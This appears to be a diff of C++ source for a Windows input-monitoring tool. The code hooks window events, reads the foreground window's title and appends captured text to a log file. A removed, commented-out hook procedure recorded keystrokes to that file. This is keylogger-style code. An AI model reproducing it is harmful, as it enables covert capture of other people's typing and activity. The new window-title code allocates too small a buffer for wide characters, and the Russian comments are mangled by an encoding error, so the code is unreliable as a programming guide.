@@ -56,20 +56,6 @@ HWINEVENTHOOK HandleUserInput::SetWinHook(WINEVENTPROC callBack)
 	}
 }
 
-////HookProc Ч это заполнитель дл€ имени, определ€емого приложением.
-//LRESULT CALLBACK HandleUserInput::HookProc(int nCode, WPARAM wParam, LPARAM lParam)
-//{
-//	// process event
-//	if (nCode >= 0 && wParam == WM_KEYUP) {
-//		int vkCode = lParam;
-//		SetKeysState();
-//		std::string saveText = GetSymbol(vkCode);
-//		//TODO: File Append 
-//		AppendTextToFile(_filename, saveText);
-//	}
-//	return CallNextHookEx(NULL, nCode, wParam, lParam);
-//}
-
 //void HandleUserInput::ActiveWindowsHook(HWINEVENTHOOK hWinEventHook, DWORD eventType, HWND hWnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime)
 //{
 //	//std::FILE.AppendAllTExt
@@ -82,9 +68,16 @@ HWINEVENTHOOK HandleUserInput::SetWinHook(WINEVENTPROC callBack)
 
 LPWSTR HandleUserInput::GetActiveWindowTitle()
 {
-	LPWSTR wnd_title = new WCHAR[maxChars];
 	HWND hwnd = GetForegroundWindow(); // get handle of currently active window
-	GetWindowText(hwnd, wnd_title, sizeof(wnd_title)+2);
+
+	char cTxtLen = GetWindowTextLength(hwnd);
+
+	// Allocate memory for the string and copy 
+	// the string into the memory. 
+
+	LPWSTR wnd_title = (LPWSTR)VirtualAlloc((LPVOID)NULL, (DWORD)(cTxtLen + 1), MEM_COMMIT, PAGE_READWRITE);
+	GetWindowText(hwnd, wnd_title, cTxtLen + 1);
+
 	return wnd_title;
 }
 
@@ -253,13 +246,12 @@ void HandleUserInput::GetFile()
 	if (fileExists)
 	{
 		// ‘айл существует, просто открываем его дл€ чтени€ и записи без перезаписи
-		//file = CreateFile(_filename, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-		hFile = CreateFile(_filename, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+		//hFile = CreateFile(_filename, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+		hFile = CreateFile(_filename, GENERIC_READ | FILE_APPEND_DATA, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	}
 	else
 	{
 		// ‘айл не существует, создаем его
-		//file = CreateFile(_filename, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
 		hFile = CreateFile(_filename, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
 	}
 
